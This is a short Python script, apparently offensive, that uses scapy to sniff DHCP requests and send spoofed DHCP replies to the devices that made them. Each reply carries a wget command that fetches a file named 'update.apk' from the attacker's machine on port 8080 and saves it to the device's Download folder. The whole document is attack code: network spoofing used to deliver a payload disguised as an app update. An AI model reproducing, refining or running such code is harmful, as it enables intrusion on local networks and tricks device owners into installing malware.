from scapy.all import *  
import os  

def inject(pkt):  
    if pkt.haslayer(DHCP):  
        attacker_ip = os.popen("hostname -I").read().split()[0]  
        payload = f"wget http://{attacker_ip}:8080/update.apk -O /sdcard/Download/update.apk"  
        spoofed_pkt = Ether(dst=pkt[Ether].src)/ \  
                     IP(dst=pkt[IP].src)/ \  
                     UDP(sport=67, dport=68)/ \  
                     BOOTP(chaddr=pkt[Ether].src)/ \  
                     DHCP(options=[("message", payload)])  
        sendp(spoofed_pkt, verbose=False)  

sniff(filter="udp and port 67", prn=inject, store=0)  
